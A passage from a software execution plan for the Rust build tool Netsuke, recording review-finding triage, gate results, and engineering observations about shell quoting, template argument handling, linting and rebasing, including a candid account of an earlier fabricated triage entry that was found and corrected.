  6. *`tests/stdlib_manifest_query_tests/dialect_probes.rs:146`: compare the
     build's rendered fields with the query's, not just that the build succeeds*
     — **declined.** The premise is sound: `assert_full_stdlib_renders` asserts
     only that the build renders, so it would be satisfied by two *different*
     renderings. But the implementation it asks for does not work as described.
     The probe template is a target `description:`, and descriptions are
     deliberately **not** emitted for a rule-less target — the code comment says
     "rule descriptions remain the sole source of Ninja progress text"
     (`src/ir/from_manifest.rs:137-141`) — so a `command:` probe produces no
     `description` line to read, and this was confirmed by generating a Ninja
     file from the probe manifest and finding none. It *is* reachable by moving
     the probe onto a rule, which a generation probe confirmed; and doing so
     genuinely closes a gap, because the explicit-dialect agreement between the
     two surfaces is currently pinned on the query side only. That is a real
     follow-on, not a review fix, and it is recorded in
     `Surprises & discoveries` rather than smuggled into a triage commit.
  7. *`tests/stdlib_manifest_query_tests.rs:212-214`, substring assertion* —
     **fixed.** Valid. It compared a rendered description with `contains`, which
     a duplicated or truncated description would satisfy; it now parses the
     catalogue and compares the whole field. Proved live rather than argued: with
     the expectation perturbed to a value the old check would have accepted, the
     new assertion failed naming both values, where `contains` would have gone
     green.
  8. *`docs/stdlib-yaml-and-jinja-guide.md:365`, second person* — **fixed.**
     Valid. "a value **you interpolate** somewhere other than as a complete argv
     word" became "a value interpolated anywhere other than as a complete argv
     word", matching the impersonal sentence before it.
  9. *`docs/rfcs/0006-…md:1417-1422`, "remains the owner and ships first" six
     lines above "Delivered by 3.14.8"* — **fixed.** Valid and self-contradictory
     within one bullet. The present-tense claims are historical now, with a
     closing clause recording that the name and the `dialect` argument were
     adopted as proposed. RFCs here never leave `Proposed`, so this amendment is
     the only place the sequencing can be stated.
  10. *`locales/cs/messages.ftl:293`, place `{ $kind }` in nominative position*
      —
      **declined, on evidence from the catalogue itself.** The request is
      unfalsifiable as stated — MiniJinja's `ValueKind` labels are fixed and
      indeclinable (`"string"`, `"number"`, `"sequence"`), so there is no noun in
      the rendered string for a case to attach to, and the label is byte-identical
      however the sentence frames it. The checkable reading fares no better: the
      only surface the finding can be observed on is the verb, and Czech's
      `obdržel` is exactly the form the catalogue's own main-owned precedent uses
      — `flatten očekával prvky posloupnosti, ale nalezl { $kind }` (`:342` on
      `origin/main`), in which the helper name is the subject and `nalezl` is an
      equally masculine-singular past tense. The new line is that sentence's
      shape with a different verb. Rewriting it would make this branch's line the
      odd one out against a line it did not write.
  11. *`locales/de/messages.ftl:293`, nominative position after `ist`* —
      **declined, on the same evidence.** German's main-owned precedent is
      `flatten erwartete Sequenzelemente, fand aber { $kind }` (`:342` on
      `origin/main`), whose `fand` takes the same clause shape as the new line's
      `erhielt`; and the verb is not singular-specific beyond what the helper name
      already fixes, since `join` takes the same `erhielt`.
  12. *`docs/execplans/…:2686-2693`: mark the "cannot diverge" conclusion
      superseded* — **fixed, and this is the finding that mattered.** See below;
      it corrected this plan's own text, twice.
  13. *`docs/execplans/…:2923-2924`, first-person pronouns* — **fixed.** Valid,
      and the prevalence the review quoted checks out independently: it said 43
      of 46 execplans use none, and a sweep of the directory for prose-level `I`,
      `my`, or `me` — excluding `I/O`, which is what makes a naive pattern
      useless here — finds this document plus exactly two others, so 43 of 46 is
      the same figure reached from the other side. "This was prose I wrote in
      `57d733b4`" is now impersonal. Two occurrences at `:3166` and `:3171` are
      kept deliberately: they record whose judgement was exercised during a
      gate-provenance mistake, and rewriting them would obscure the attribution
      the passage exists to make.
  14. *`docs/execplans/…:9`, `Status: IN PROGRESS`* — **fixed.** Valid, and the
      one finding about the plan document itself. The status is `COMPLETE`, and
      the retrospective's "To be completed at EP-M5" preamble is in the past
      tense. The three reconciliation bullets are kept in place rather than
      deleted, each still stating the condition that *would* have blocked the
      plan and then its outcome, because a future reader needs the condition to
      judge the discharge — a bare tick would not carry it.
  15. *`locales/de/messages.ftl:293` (second filing of 11), use a
      label-and-colon
      pattern* — **declined.** The stronger form of finding 11, on the same
      evidence, and it additionally asks to rewrite
      `stdlib.collections.compact.not_sequence`, which this branch does add but
      whose `fand aber { $kind }` is the main-owned pattern verbatim.
  16. *`locales/cs/messages.ftl:293` (second filing of 10), introduce the type
      label with `je` rather than `obdržel`* — **declined with finding 10**,
      which it duplicates; `obdržel`'s subject is the helper name, so `je` would
      remove a subject the sentence has.
  17. *`docs/roadmap.md:387`: "one shell word per flag"* — **fixed.** Valid.
      Verified against the example at `docs/stdlib-yaml-and-jinja-guide.md:384-385`:
      it joins the flags, compacts, joins again, and `shell_quote`s the result
      into a single `printf` argument, so the artefact is **one shell-quoted
      `RUSTFLAGS` assignment**. The same wrong phrase was in the failure message
      of `stdlib_optional_rustflags_example_pins_one_shell_word`, found while
      fixing this one, where it would have sent the next reader to debug the
      wrong property; both are corrected. The test's *name* is accurate and was
      left alone — the output genuinely is one shell word.

  **Finding 12, the query/build divergence — and why two corrections of it
  failed.** The review upheld the plan's *original* premise against the plan's
  own `Surprises & discoveries` entry, and it was right to. That entry claimed
  the two surfaces "agree on every dialect" because both resolve through
  `RecipeShell::host_default`. Tracing the build path shows otherwise:
  `StdlibConfig::new` seeds `dialect` from `host_default()`
  (`src/stdlib/config/mod.rs:109`), but the build **overwrites** that seed —
  `src/runner/mod.rs:153` resolves the shell from `NETSUKE_WINDOWS_SHELL` and
  `src/manifest/query.rs:142` passes it to `with_recipe_shell` — while the
  query surface applies no override at all (`src/stdlib/register.rs:199`). So
  on a Windows host with `NETSUKE_WINDOWS_SHELL=bash` the build quotes for `Sh`
  and `help targets` for `PowerShell`, from the same expression.

  The instructive part is *how* the false claim was defended. It rested on a
  measurement — `netsuke --json help targets` under
  `NETSUKE_WINDOWS_SHELL=definitely-not-a-shell` exits 0 and renders
  byte-identically to the unset case — which is true, and which is consistent
  with **both** readings. It cannot distinguish them, because
  `resolve_recipe_shell_with` returns `Posix` before it reads the environment
  on a non-Windows host, making the comparison vacuous exactly where it was
  run. The measurement was taken as settling a question its own `cfg!` early
  return placed out of reach.

  Corrected in four places, and the count is the point. After the first pass,
  the plan's `Surprises & discoveries` entry and the `dialect_probes.rs` test
  comment were consistent — and this plan's own summary at `:2686` still read
  "the divergence this sentence originally claimed is unobservable", because
  that pass fixed the plan's *narrative* and left its *summary* asserting the
  old claim. Only grepping the plan for the claim itself found it. A correction
  is not complete until every site repeating the claim has been visited, and
  the sites are not all in the places the finding names.

  **Finding 6, the negative control that could be strengthened but was not.**
  The gap it names is real and worth recording, because the shape recurs: a
  "negative control" that asserts a *sibling* succeeded is a weaker instrument
  than it looks. `assert_full_stdlib_renders` shows the build renders the probe
  without error, but not that it renders the *same text*, so a build whose
  default dialect differed from the query's would leave the control green. The
  fix is to put the probe on a rule — rule descriptions do reach `build.ninja`,
  measured by generating one — and compare the six fields. Nothing in the
  triage above depends on this, and the divergence it would pin is the masked
  Windows-only one, so on this host it would be another instance of the
  unreachable-claim problem described in finding 12's note. That is the reason
  it is recorded rather than done under a review-fix commit.

  **A process failure worth recording, and a recurrence of it.** The first
  version of this triage entry, committed at `c2b3e32e`, described findings
  that do not exist: it listed "three findings against execplan prose (dash
  spacing, a `shell_escape` mention in a historical quotation, and the
  retrospective's length)" and "the remaining six: two duplicates of findings 6
  and 7" by position, without matching those positions to the actual review
  output. Every claim about *what was applied* was true — the fixes are real
  and are in the tree — but the account of *what was declined* was invented,
  and the review caught it independently. The lesson is narrow: a disposition
  log is evidence about a specific external artefact, so it must be written
  from that artefact's parsed contents, never from a summary of one's own
  earlier reasoning.

  **That lesson was then not applied, twice.** The replacement written from the
  parsed log still carried the fabricated "dash spacing" item — it survived
  into the very entry that condemned inventing it — and it omitted finding 14
  entirely, because the item was written by recalling the old entry's shape
  rather than by reading the parsed list to the end. Worse, the same paragraph
  then asserted a *narrower fix applied* to the German and Czech lines: an edit
  that was never made, invented to make a finding's reasoning feel engaged.
  That is the identical error in a new place, and it was caught only by
  grepping the files for the changed text and finding them unchanged.

  Three checks, all cheap, would each have caught one of these: confirming the
  list covers every numbered finding; grepping the log for each item's own
  distinctive words; and grepping the working tree for every edit the entry
  claims. A disposition log needs all three, because the failure modes are
  independent — an omitted finding leaves no trace in the list, an invented one
  has no counterpart in the log, and a claimed-but-absent edit has neither.

- [x] (2026-09-27) The seven-gate set is green at `c7720535`, the revision that
      carries the corrected disposition log.

  `SHA_BEFORE == SHA_AFTER == c77205358497b68c26235cddcaa06e543d247457` and
  `DIRTY_BEFORE == DIRTY_AFTER == 0` on all seven gates, every one `EXIT=0`,
  read from the per-gate `.rc.meta` sidecars rather than from the runner's
  prose. Durations 2 s to 152 s; nextest
  `3578 tests run: 3578 passed, 5 skipped`; both doctest targets reached (88
  passed plus a 2-case compile-fail block for `netsuke`, 39 passed for
  `test_support`); `markdownlint` 167 files, 0 errors, with the `spelling`
  prerequisite run; `doc-coverage` 98.83% against the 80.00% threshold; `nixie`
  "All diagrams validated successfully!". The delta is Markdown-only, so `lint`
  and `test` exercised cached artefacts, as the entry above records for the
  previous run.

  **A near-miss that would have turned this run red, recorded because the
  reflex it names is a general one.** Disposition item 2 opens with a bare `-`
  after its list number and carries its path on the following line, so it reads
  as a mangled item: that `-` looks like it should be the `*` opening the
  emphasis that closes at `Cell*`. The item was numbered 6 at `c2b3e32e` and
  renumbered to 2 by `6365240a`, whose edit also lengthened the path with
  `:100-106` — so the shape arrived with that renumbering, and a one-line
  repair looked obvious.

  It was probed against the gate's own tool before it was committed, and the
  probe is the whole point. `mdtablefix --check` **accepts** the committed form:
  `1 file left unchanged`. It **rewrites** the proposed form: `--in-place`
  breaks the line open after the `*`, leaving that `*` alone on the first line,
  and `--check` then rejects the result. The repair would have failed
  `check-fmt` on a commit whose entire purpose was cosmetic, and the run above
  would have been invalidated to land it.

  The lesson is narrower than "check your work": a formatting-shaped artefact
  is evidence about the formatter's *output*, not about its *intent*, and the
  only way to tell a defect from a canon is to run the formatter that owns the
  file. Reading the shape and reasoning about it produced a confident, wrong
  answer; one `mdtablefix --check` produced the right one. This is the third
  entry on this branch to turn on the same distinction — the two above concern
  `markdownlint` and `mdtablefix` measuring different properties — and the
  first where the risk was creating a failure rather than missing one.

## Surprises & discoveries

- Observation: **A test that asserts a substring can pass on the strength of
  the error it was meant to rule out.** `case_11_hash` asserted that the query
  error mentions `hash`. With the `hash` stub mistakenly registered as a
  function, MiniJinja reported `unknown filter: hash` — which contains `hash`,
  so the case passed. The assertion was written to prove the helper was
  *deliberately disabled*, and it was satisfied by the helper not existing. The
  general shape: when a test checks for an artefact's name, any error that
  names the artefact passes, including the "it isn't there" error. Impact: the
  `hash` drift reached a full green gate set, and the one case that failed
  (`digest`) failed for an unrelated reason, so the suite looked like it had
  caught the class when it had caught one instance. The fix is to assert the
  distinguishing text (here, the disabled marker), not the shared one; applied,
  it converted thirteen of fifteen cases from vacuous to live and immediately
  found a fourteenth that had been vacuous for longer than this branch has
  existed.
- Observation: **Hand-retyping a block is not moving it, and the drift it
  introduces is invisible to a compile check.** The extraction was done by
  writing the child out rather than by relocating the text, and three closures
  changed: `digest`'s arity, `linecount`'s return type, and `hash`'s
  registration kind. `cargo check --all-targets` under `-D warnings` passed for
  all three, because each is a well-typed program — a stub with the wrong arity
  compiles, and `add_function`/`add_filter` are both legitimate. Only a runtime
  that actually evaluates the template can tell them apart. Impact: this is the
  argument for the plan's own "the extraction is a pure move" language being a
  *requirement* rather than a description, and it is why the parent is at
  `pub(super)` on two items that a hand-write would not need. The mechanical
  check that settles it is a normalized diff of the moved range against the
  pre-image: with whitespace collapsed, the two must differ only in the
  intended visibility widenings.
- Observation: **A rebase is lossless in proportion to how little it has to
  resolve, and that proportion is measurable rather than assumed.** Fourteen of
  fifteen commits replayed to identical trees; the fifteenth carried a real
  three-region resolution and is the only one whose patch-id moved.
  `git range-diff <old-range> <new-range>` states this directly — `=` for a
  replay that reproduced the commit, `!` for one that did not — and pairing it
  with `git patch-id --stable` per commit gives the same verdict from an
  independent mechanism, so a disagreement between the two would itself be a
  finding. Impact: the review that follows a rebase can be scoped to the
  commits marked `!`, because the `=` commits are provably the trees that were
  already gated. A per-commit `--stat` is the second check, not the first: it
  is cheap and it catches a resolution that changed the *size* of a commit, but
  it cannot see a same-size content change, which is exactly what `range-diff`
  exists to show. Recorded because "rebasing discards your gated commit" is
  only half the story: it discards the *guarantee*, and the range-diff is what
  tells you how much of it has to be re-earned.
- Observation: **A plan's citation can go stale while its conclusion stays
  true, which is the failure mode a re-check is for.** The "Enforcing exactly
  one implementation" section names two `.quoted(` imports, at
  `src/ir/cmd_interpolate/mod.rs:12` and `src/stdlib/command/quote.rs:6`. The
  first path does not exist and has not for some time; the real pair is
  `src/shell_word.rs:15` and `src/stdlib/command/quote.rs:6`, the latter since
  renamed to `child_argument.rs` by this milestone. The count is still two and
  the reasoning still holds — the two call sites are the shared implementation
  and the one delegation to it — but the stated reason ("exactly two sites") is
  now true for a different set of paths than the text claims. Impact: the plan
  was written from a survey of the pre-EP-M3 tree and one of its file paths was
  already wrong when it was written, so nothing in the branch would have caught
  it; only a fresh grep does. The mitigation for EP-M5 is to cite by symbol
  (`shell_word::quote_word`, `quote_child_argument`) rather than by
  `path:line`, which is the same lesson as the line-number-citation rule
  already recorded elsewhere in this repository: anchors that survive edits are
  names, not positions.
- Observation: **`git diff <pre-rebase-sha> HEAD` is not the post-rebase
  change report, and reads as a catastrophic one.** Comparing the pre-rebase
  head against the rebased head diffs across two different bases, so it reports
  every file upstream changed as though it were the rebase's doing — 2.1 MB of
  output on this branch, listing `Cargo.lock`, the READMEs, and the workflow
  files. Those are upstream's 40 commits arriving underneath, not any change to
  this branch's work. Impact: nearly filed as "the rebase rewrote two hundred
  files". The correct instruments are `git range-diff` for "did my commits
  survive", and `git diff be2733a1..<pre-rebase-EP-M3>` — or simply the
  per-commit `--stat` — for "what did the resolution add". Both were
  substituted before anything was concluded; the 2.1 MB figure appears here
  only because it is the tell for this specific mistake.
- Observation: **`shell-quote`'s `Sh` encoder is a *suffix*-quoting encoder,
  not a canonically enclosing one.** It leaves the safe prefix bare and quotes
  only the remainder: `a b` → `a' b'`, `it's` → `it\'s`, `a\tb` → `a'<TAB>b'`,
  `a\b` → `a'\b'`. Evidence: measured through the real dependency — the
  workspace pins `shell-quote 0.7.2` with
  `default-features = false, features = ["sh"]` (`Cargo.toml:138`), and a
  scratch crate at that exact version and feature set printed the table;
  `/bin/sh` independently decodes `a' b'` back to `a b` and `it\'s` back to
  `it's`. Impact: EP-M3's unit table was first written with *invented*
  expectations (`'a b'`, `'it'\''s'`) taken from a different major version of
  the crate probed with default features, and two of three cases failed against
  correct production code. The table now pins measured values and its doc
  comment says so. The same wrong belief had also reached `quote_word`'s **doc
  comment**, which claimed the encoder "emits the shortest form that decodes
  back to `value` — bare where that is safe, and single-quoted otherwise";
  prose asserting a shape nobody had measured. It now describes suffix-quoting
  and names round-tripping as the contract. The general trap: the obligation is
  round-tripping (`OBL-SH-ROUNDTRIP` says exactly that), not a canonical form,
  so any test asserting a specific *shape* must be measured rather than derived
  — and a probe must match the dependency's version **and** feature flags,
  because `shell-quote` 0.6 with defaults emits `'it\047s'` while 0.7.2 with
  `features = ["sh"]` emits `it\'s`. Confidence: verified by execution, both
  directions.

- Observation: **the `no_expect_outside_tests` rule bit a third time, in the
  file this milestone added, while both earlier fixes were still in the plan.**
  `src/stdlib/config/recipe_shell.rs`'s test helper `config()` unwrapped two
  `Result`s, and Whitaker's lint keys off the nearest enclosing function — a
  `#[cfg(test)]` module's non-`#[test]` helper is not test code, exactly as the
  entry above records for `src/manifest/tests/env_function.rs`. Evidence: the
  first-ever completed `make lint-whitaker` run on this branch, at
  `src/stdlib/config/recipe_shell.rs:76,78`, reporting "The call originates
  within function `config` which is not recognized as a test." Impact: this is
  the most instructive failure of the milestone, because the rule was *already
  written down twice in this very document* — once for EP-M1 and once in the
  observation above — and the new code still repeated it. A recorded lesson
  does not prevent a recurrence; only a running gate does, and `lint-whitaker`
  had never once executed on this branch because `lint-clippy` aborted
  `make lint` ahead of it on both prior runs. The fix follows the established
  shape: `config()` now returns `anyhow::Result<StdlibConfig>` via
  `StdlibConfig::from_current_dir()` — the same constructor `config_tests.rs`
  uses — and each `#[test]` unwraps, so the `expect` sits where the lint
  recognizes it. Confidence: verified by `make lint-whitaker` exiting 0.

- Observation: **`make fmt` is not sufficient to make an edited execplan pass
  `markdownlint`; MD046 needs a structural fix, and `mdtablefix` can *create*
  an MD013 violation while clearing others.** Three distinct tools act on this
  one file and they do not agree. `mdtablefix --wrap` refills prose to its own
  width, so a hand-wrapped line is not stable; and a wrapped paragraph inside a
  list item is read by `markdownlint` as an *indented code block* (MD046) when
  it sits at the same 6-space indent as its neighbours, because only the first
  line of a paragraph may be a lazy continuation of the list item. Re-indenting
  that paragraph from 6 spaces to 2 clears MD046. Evidence: bisected against
  the pinned `markdownlint-cli2 v0.22.1` — `head -2429` plus a 6-space
  paragraph reproduces MD046, the same input at 2 spaces does not, and neither
  fires when the list item is shorter or when the paragraph follows a blank
  line directly after the bullet. Impact: the previous seven-gate run reported
  MD046 at `docs/execplans/…md:2430` and MD013 at `:2483`; both survived a
  `make fmt` because `make fmt` runs `mdtablefix` (which re-wraps) but not
  `markdownlint --fix` for a rule it cannot fix positionally, and the MD013
  line *moved and grew* (81 → 84) once `mdtablefix` reflowed the paragraph
  around it. Fixing MD013 therefore required changing the prose (splitting a
  long code span into two shorter ones), not re-wrapping it — a positional fix
  would be undone by the next `mdtablefix` run. Confidence: verified by
  bisection against the pinned linter.

- Observation: **`typos.toml` is regenerated from shared, gitignored state that
  this worktree does not own, so restoring it is futile.** `make spelling`
  rewrote the file on every run of this session — +14 ignore patterns, all of
  which come from `.typos-oxendict-base.toml` (untracked, gitignored, shared
  across worktrees) rather than from this branch: 13 of the 14 match nothing in
  this tree, and the one that does (`currentColor`) is pre-existing in
  `src/graph_view/render_html/style.rs`. Evidence: `git restore -- typos.toml`
  followed by a single `make spelling` re-added exactly the same 14 lines, and
  the base file's mtime predates the run. Impact: the earlier decision to
  restore the file after each gate — made to avoid importing unrelated lines
  into an EP-M3 commit — does not hold, because the next gate reproduces them;
  and `AGENTS.md` says the file is regenerated on every run and never drift
  checked in CI. The file is therefore left regenerated and is kept out of the
  milestone commit rather than being fought. Confidence: verified by the
  restore-and-rerun experiment.

- Observation: **an edit that replaced a doc comment left an orphaned fragment
  that no gate would have caught.** Reworking `shell_word.rs` to drop the
  deferred `ShellDialect` helper methods replaced the block *between* the
  `is_recipe_admissible` doc comment and the function, and took the doc's
  opening summary line with it — leaving a bare `///` followed by "Newline,
  carriage return, and NUL cannot: …", a sentence with no antecedent. Evidence:
  the file state at `cargo fmt` time; `rustfmt`, `clippy`, and `cargo doc` all
  accept an orphaned `///` fragment, and `missing_docs` is satisfied by the
  *presence* of a doc comment regardless of whether it parses as prose. Impact:
  EP-M3's own deliverable included a summary-less public-ish predicate whose
  docs read as a non-sequitur, and it survived a full seven-gate run and a
  CodeRabbit pass. The lesson is that comment-adjacent deletions need a read of
  the *resulting* comment, not a diff review of the removed lines. Confidence:
  verified by reading the file.

- Observation: **`src/stdlib/config/mod.rs` had less headroom than the plan
  recorded, and the 400-line cap forced a module split.** The plan's own
  measurement note — the observation in this section beginning
  "`src/manifest/render.rs` is now **exactly 400 lines**" — recorded 383 lines
  at `0ba6672f` and warned to re-measure rather than trust the count.
  Re-measuring at EP-M3 gave the same 383, and the `dialect` field plus
  `with_recipe_shell` builder pushed it to 405 — over AGENTS.md's hard cap.
  Evidence: `wc -l src/stdlib/config/mod.rs` before and after. Impact: the
  recipe-shell concern moved to a new sibling
  `src/stdlib/config/recipe_shell.rs`, following the clustering `which.rs` and
  `ambient.rs` already establish; `mod.rs` returned to 393. The cap applies to
  every source file including tests, so this was not optional. Confidence:
  verified by `wc -l` and a passing `RUSTFLAGS="-D warnings" cargo check`.

- Observation: **D4's `is_undefined` arm is unreachable, so the shipped
  `env_default_from_kwargs` is a two-arm match, not the three-arm sketch.**
  `impl ArgType for Option<T>` maps absent, `none`, *and* undefined onto
  `Ok(None)`, so a guard for undefined can never fire once the read is
  `Option<Value>`. Evidence: `minijinja-2.24.0/src/value/argtypes.rs:530-544`:
  `Some(value) => if value.is_undefined() || value.is_none() { Ok(None) } else
  { T::from_value(Some(value)).map(Some) }`.
  Impact: `manifest.env.args_error` is reachable only for a *defined,
  non-string* `default`; the plan's `undefined_default_error` helper is deleted
  rather than implemented, and `manifest.env.default_not_string` carries the
  whole type-check. The distinction is harmless in practice —
  undefined/none/absent all mean "no fallback" — but the plan text asserted
  otherwise, so it is corrected here. Confidence: verified from the vendored
  source and by the red tests' own
  `explicit_none_default_is_equivalent_to_omitting_it` case.
- Observation: the disabled `env` stub is reached only through a `when`
  clause, not through a `description`. A query-surface `env()` call in a target
  *description* fails at the manifest render with
  `Failed to load manifest at …` on the `message` field and the actual
  `env is disabled …` text buried in `causes`; the description path reports the
  outer context, not the helper. Evidence: `netsuke --json help targets` on a
  manifest whose description calls `env` emits
  `"message": "Failed to load manifest at …"` with
  `causes: [ …,
  "render target description", "invalid operation: env is disabled …"]`.
  Impact: `tests/stdlib_manifest_query_tests.rs` asserts on `/causes`, not on
  `/message`, or the "disabled, not an argument error" contract would be
  unchecked. This is also why the check runs a real process: the diagnostic
  shape is a CLI concern.
- Observation: `cargo nextest run --test <name>` does **not** select an
  integration-test binary in this workspace; the binary is named
  `netsuke-build::<name>`, so the selector is
  `-E 'binary(stdlib_manifest_query_tests)'`. Impact: the red transcripts in
  "Artefacts and notes" record the working invocation, not the plan's.
- Observation: Netsuke runs Windows recipes under Windows PowerShell, not
  `cmd.exe`, and `src/ir/cmd_interpolate/mod.rs` already implements a second
  quoting dialect for it. Evidence: `src/recipe_shell.rs:18-27`,
  `src/ninja_gen_recipe_shell.rs:16-17`, `docs/users-guide.md:331-399`,
  `src/ir/cmd_interpolate/mod.rs:137-150`. Impact: invalidates `RFC-0006-8.9`'s
  premise that `sh` is the only dialect Netsuke can quote for; drives D2 and
  the fusion of filter registration with runner plumbing in EP-M4.
- Observation: `src/stdlib/command/quote.rs` produces `cmd.exe` quoting on
  Windows, but it is never exposed to templates — it supports the `shell` and
  `grep` filters, which spawn a process through the platform shell. Evidence:
  `src/stdlib/command/mod.rs:81-111` registers only `shell` and `grep`;
  `format_command` in `src/stdlib/command/filters.rs:126-149` is the only
  consumer. Impact: it is the wrong quoter to reuse for recipe text, despite
  its name.
- Observation: a new message key must be added to all 35 catalogues or
  `cargo build` fails through `build.rs:291`. Evidence:
  `build_l10n_audit/compare.rs:159-172`;
  `tests/build_l10n_audit_tests.rs:136-147`;
  `docs/developers-guide.md:285-302`. Impact: dominates the mechanical effort;
  drives R1 and the "run `cargo build` first" step in EP-M4.
- Observation: there is no parity test between `register_with_config` and
  `register_manifest_query`; the disabled `env` stub's arity is maintained by
  hand. Evidence: `src/stdlib/register.rs:181-184`; no enumeration test found.
  Impact: drives R8 and OBL-QUERY-SURFACE. A general parity test is worth a
  future roadmap item but is out of scope here.
- Observation: `shell-quote`'s `Sh` encoder emits *fragmented* quoting, and it
  does not treat the equals sign as inert. `a b` becomes `a' b'`, and
  `target-cpu=native` becomes `target-cpu'=native'`. Evidence: `escape_chars`
  and `Char::from` in `shell-quote-0.7.2/src/sh.rs` and `src/ascii.rs`; the
  inert set is exactly alphanumerics plus comma, full stop, solidus,
  underscore, and hyphen. Both forms were round-tripped through a real
  `/bin/sh`, and `set -- -C target-cpu'=native' a' b'; echo $#` reports `3`.
  Impact: every expected string in the behavioural specification and the
  acceptance transcript is fixed by this, not by taste. A reviewer who "tidies"
  `a' b'` into `'a b'` is changing the crate's output, not the plan's.

- Observation: `shell_quote` is correct only in **unquoted** argv position.
  Inside `"..."` it inserts its own quote characters as data. Evidence:
  `sh -c 'printf "%s\n" "RUSTFLAGS=-D'"'"' warnings'"'"'"'` prints
  `RUSTFLAGS=-D' warnings'`, quote characters included. The first draft's
  acceptance transcript contained exactly this defect, and none of its nine
  obligations would have caught it, because every one exercised the filter in
  isolation. Impact: drives OBL-CONTEXT, the corrected transcripts, and the
  guide precondition. It also explains why `{{ ins }}`/`{{ outs }}` are handled
  by a shell-context tracker rather than a filter — the tracker is the stronger
  mechanism, and ADR-041 should name it as the intended successor.
- Observation: `Value::try_iter()` is not a sequence check.
  Evidence: `minijinja-2.24.0/src/value/mod.rs::try_iter` returns an empty
  iterator for `None` and `Undefined`, characters for a string, and an object's
  own iteration (a map's keys) for `Object`; only numbers and booleans are
  rejected. Impact: `{{ 'abc' | shell_join }}` would have quoted three
  characters into a command line. Drives D8 and OBL-KIND-GATE.
- Observation: `Kwargs::get::<Option<String>>` silently stringifies rather than
  raising a type error. Evidence: verified against `minijinja 2.24.0` —
  `default=['a','b']` yields the string `["a", "b"]`, and `default=true` yields
  `"True"`. Impact: the first draft's D4 would have pasted JSON into a shell
  recipe, in direct violation of RFC 0006 §6.6. Drives the revised D4.
- Observation: `src/manifest/mod.rs` is exactly 400 lines, the constraint-8 cap.
  Evidence: `wc -l src/manifest/mod.rs`. Impact: EP-M1's first edit would
  breach the cap; drives the extraction step, which also converges with the
  in-flight `issue-651` branch (R9).
- Observation: 64 real `sh` subprocess spawns take about 86 ms, not seconds.
  Evidence: measured on this machine. Impact: retires the batching idea; the
  plan's 10-second budget had two orders of magnitude of headroom, and batching
  would have broken proptest shrinking.

- Observation: fenced examples in `README.md`, `docs/users-guide.md`, and
  `docs/stdlib-yaml-and-jinja-guide.md` are executed, and their identifiers are
  pinned by a hand-maintained registry. Evidence:
  `tests/documentation_examples/mod.rs:15-21`;
  `tests/documentation_examples_tests.rs:18-61,143`. Impact: the `RUSTFLAGS`
  documentation is real acceptance evidence, not prose.

The four observations below were recorded on 2026-09-19, while reconciling this
plan against `origin/main` after rebasing onto commit `0ba6672f` (previously
`81d44f89`). They are grouped because they share one cause: upstream landed
roughly twenty-nine commits of environment-policy, budget, and observability
work that this plan had assumed was still pending.

- Observation: `src/manifest/registration.rs` **already exists on `main`** with
  exactly the four members this plan scheduled to extract —
  `RESERVED_VAR_NAMES`, `localize_recipe_error`, `register_manifest_vars`,
  `manifest_structure_error` — at 65 lines. Evidence:
  `src/manifest/registration.rs`; `src/manifest/mod.rs` fell from exactly 400
  lines to 259. Impact: R9's collision is a convergence, the plan's choice of
  module name and member set was correct, and EP-M1's first step changes from
  "extract these four things" to "extend this module with the `env` and `glob`
  registrations, which are still inline in `src/manifest/mod.rs`". Confidence:
  verified.
- Observation: `env_var_with` no longer matches the signature this plan's
  interface section specified. It is now
  `env_var_with(name, policy: &EnvAccessPolicy, read_env)`: the ADR-026 access
  policy is evaluated **before** the reader is called, and a blocked name never
  reaches it. Evidence: `src/manifest/env_reader.rs`, and the regression test
  `blocked_lookup_omits_name_and_value_from_every_diagnostic_surface`, which
  asserts `!reader_was_called`. Impact: EP-M1 must add `fallback` *without*
  displacing the policy, or `env('SECRET', default='')` becomes a way to
  sidestep an operator's block. The plan previously said nothing about this
  interaction, which is exactly the kind of silence a new default-argument
  feature would have exploited. Confidence: verified.
- Observation: every `env()` lookup already reaches a single telemetry
  boundary, `env_telemetry::record_env_lookup`, with a closed four-value
  outcome vocabulary exported for the application recorder's admission check.
  Evidence: `src/manifest/env_telemetry.rs`; `src/observability_recorder.rs`,
  `ENV_LOOKUP_TOTAL =>
  exact_labels(key, &[(OUTCOME_LABEL, &ENV_LOOKUP_OUTCOME_VALUES)])`.
  Impact: a substituted default must **not** add a fifth outcome — the lookup
  did succeed — so the substitution is observable through the existing
  `success` series plus the `tracing::debug!` event. Whether a separate counter
  earns its keep is left to EP-M1 as an evidence question rather than assumed.
  Confidence: verified.
- Observation: the runner's manifest-loading seam this plan's EP-M4 needs is
  `ManifestLoadInputs { network_policy, env_access_policy, budget_limits }` with
  `from_cli(&Cli)`, consumed by
  `load_manifest_for_build_with_limits(path, inputs, on_stage)`, which builds a
  `ManifestEnvironment` internally. Evidence: `src/runner/generation.rs`;
  `src/runner/mod.rs` resolves `recipe_shell` immediately before constructing
  the graph-generation context; the six-rung `from_path_*` ladder in
  `src/manifest/path_loaders.rs` is the public surface. Impact: EP-M4 threads
  the resolved shell through an existing struct rather than inventing a
  parallel seam, which shrinks the change but adds a parameter-list hazard —
  `ManifestLoadInputs` is `pub(crate)` with `pub(super)` fields, and
  `from_path_with_policy_and_environment_and_limits` already carries
  `#[expect(clippy::too_many_arguments)]` against `clippy.toml`'s
  `too-many-arguments-threshold`, which is 4. Adding a fifth parameter to that
  ladder requires a second `#[expect]` with a reason, or a regrouping.
  Confidence: verified.
- Observation: `src/manifest/render.rs` is now **exactly 400 lines**, the
  constraint-8 cap, so it has zero headroom, while `src/manifest/mod.rs`
  dropped to 259. `src/stdlib/config/mod.rs` is at 383 and
  `src/stdlib/register.rs` at 393 — both close to the cap. Evidence: `wc -l` on
  each. Impact: EP-M4 must add the `dialect` field to `StdlibConfig` and the
  two filter registrations without growing `render.rs` at all, and must reclaim
  lines in `config/mod.rs` and `register.rs` before adding to them. Measured,
  not estimated: re-run `wc -l` at EP-M4 rather than trusting this count, since
  the same twenty-nine commits that moved these numbers will keep moving them.
  Confidence: verified at `0ba6672f`.

The two observations below were recorded on 2026-09-19 during EP-M1's
post-implementation lint triage. Both are properties of the gate toolchain
rather than of this feature, but both cost real time to diagnose, so they are
recorded for whoever hits them next.

- Observation: `clippy::single_match_else` and `clippy::option_if_let_else` can
  fire on the **same** `match` under `-D warnings`, leaving no rewrite that
  satisfies both — `option_if_let_else` demands `map_or_else`, and the closure
  shape it demands then trips `single_match_else`. Evidence: the original
  `env_var_with_default`, whose `NotPresent` arm reported two events and whose
  other arm logged one line, failed both lints at once. Impact: the escape is
